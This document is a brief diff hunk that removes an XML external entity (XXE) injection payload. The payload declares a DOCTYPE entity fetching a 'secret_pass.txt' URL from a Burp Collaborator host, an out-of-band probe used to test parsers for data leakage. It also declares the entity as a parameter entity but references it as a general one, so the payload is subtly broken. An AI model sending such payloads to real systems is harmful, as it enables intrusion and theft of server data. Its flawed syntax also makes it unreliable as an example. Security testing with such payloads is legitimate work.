@@ -1,6 +1,0 @@
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [
-<!ELEMENT foo ANY >
-<!ENTITY % xxe SYSTEM "http://w2z761oc35t8mq43013c5fedi4ovck.burpcollaborator.net/secret_pass.txt" >
-]>
-<foo>&xxe;</foo>
